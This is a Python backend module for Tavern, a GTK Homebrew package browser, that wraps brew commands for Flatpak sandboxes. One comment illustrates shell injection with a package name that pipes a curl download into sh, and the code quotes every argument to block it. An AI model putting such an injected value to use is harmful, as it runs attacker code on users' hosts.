# backend.py - Homebrew backend using the formulae.brew.sh JSON API + local brew CLI
# SPDX-License-Identifier: GPL-3.0-or-later
#
# Thin facade (tuna-os/Tavern#81) that composes the focused mixin modules and
# wires them together; the heavy lifting lives in:
#   - taps.py           -> TapsMixin    (tap scanning/trust/operations)
#   - media.py          -> MediaMixin   (icons/screenshots/readmes)
#   - backend_cache.py  -> CacheMixin   (cache I/O, JWS host caches, Brewfile parsing)
#   - backend_remote.py -> RemoteMixin  (JSON catalog/detail/analytics fetches)
#   - backend_state.py  -> StateMixin   (installed/outdated/pinned state)
#   - backend_ui.py     -> UiMixin      (async loading/search + status/progress)

import gettext
import io
import json
import os
import shlex
import struct
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.request import urlopen, Request
from urllib.error import URLError

import gi

_ = gettext.gettext
gi.require_version('GdkPixbuf', '2.0')
from gi.repository import Gio, GLib, GObject, GdkPixbuf

from .logging_util import get_logger, profile, log_timing

_log = get_logger('backend')


from .backend_icons import ico_to_png as _ico_to_png  # noqa: F401  (re-exported)
from .brew_env import (  # noqa: F401  (re-exported for compat)
    IN_FLATPAK, BREW_BIN, _is_flatpak, _find_brew,
)


def _brew_cmd(args):
    """Build a command list for running brew, using flatpak-spawn if sandboxed.

    Lives in this module (reading module globals) so tests and callers can
    monkeypatch tavern.backend.IN_FLATPAK / BREW_BIN.
    """
    if IN_FLATPAK:
        # Use flatpak-spawn to run brew on the host with updates disabled.
        # Every arg must be shell-quoted: args derive from untrusted input
        # (tap .rb filenames, Brewfile contents, GitHub tap search results),
        # and an unquoted name such as ``evil;curl host|sh`` would otherwise
        # run arbitrary commands on the HOST as this user — the app already
        # has --filesystem=home and flatpak-spawn --host (tuna-os/Tavern#89).
        quoted = ' '.join(shlex.quote(str(a)) for a in args)
        return ['flatpak-spawn', '--host', 'bash', '-c',
                f'export HOMEBREW_NO_AUTO_UPDATE=1 && export HOMEBREW_API_AUTO_UPDATE_SECS=604800 && export HOMEBREW_NO_INSTALL_ASK=1 && '
                f'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)" && brew {quoted}']
    else:
        return [BREW_BIN] + args
from .package import Package  # noqa: F401  (re-exported)
from .taps import TapsMixin
from .media import MediaMixin
from .backend_cache import CacheMixin
from .backend_remote import RemoteMixin
from .backend_state import StateMixin
from .backend_ui import UiMixin
from .cache_policy import CacheManager


class BrewBackend(TapsMixin, MediaMixin, CacheMixin, RemoteMixin, StateMixin, UiMixin, GObject.Object):
    """Backend that communicates with both the Homebrew JSON API and local brew CLI."""

    __gtype_name__ = 'TavernBrewBackend'

    loading = GObject.Property(type=bool, default=False)
    loading_status = GObject.Property(type=str, default=_('Loading Homebrew Content…'))
    loading_progress = GObject.Property(type=float, default=0.0)
    _refresh_lock = threading.Lock()

    __gsignals__ = {
        'formulae-loaded': (GObject.SignalFlags.RUN_LAST, None, (object,)),
        'casks-loaded': (GObject.SignalFlags.RUN_LAST, None, (object,)),
        'installed-loaded': (GObject.SignalFlags.RUN_LAST, None, (object,)),
        'taps-loaded': (GObject.SignalFlags.RUN_LAST, None, (object,)),
        'outdated-changed': (GObject.SignalFlags.RUN_LAST, None, (object,)),
        'pinned-changed': (GObject.SignalFlags.RUN_LAST, None, (object,)),
    }

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self._formulae = []
        self._casks = []
        self._installed_formulae = set()
        self._installed_casks = set()
        self._tap_packages = {}  # tap_name -> [Package, ...]
        self._tap_list = []  # [{name, path}, ...] for non-core taps
        self._outdated_formulae = {}  # {name: {installed, latest}}
        self._outdated_casks = {}  # {name: {installed, latest}}
        self._outdated_lock = threading.Lock()
        self._pinned = set()  # formula names pinned via `brew pin`
        self._pinned_lock = threading.Lock()
        self._search_executor = ThreadPoolExecutor(max_workers=1, thread_name_prefix='tavern-search')
        self._search_generation = 0
        self._icon_executor = ThreadPoolExecutor(max_workers=6, thread_name_prefix='tavern-icon')
        self._icon_inflight = {}  # package name -> [(package, callback), ...]
        self._icon_lock = threading.Lock()
        self._cache_dir = os.path.join(GLib.get_user_cache_dir(), 'tavern')
        os.makedirs(self._cache_dir, exist_ok=True)
        self._cache_manager = CacheManager(self._cache_dir)
        _log.debug('BrewBackend init  cache_dir=%s', self._cache_dir)

    @property
    def formulae(self):
        return self._formulae

    @property
    def casks(self):
        return self._casks

    @property
    def taps(self):
        return self._tap_list

    def get_packages_for_tap(self, tap_name):
        return self._tap_packages.get(tap_name, [])
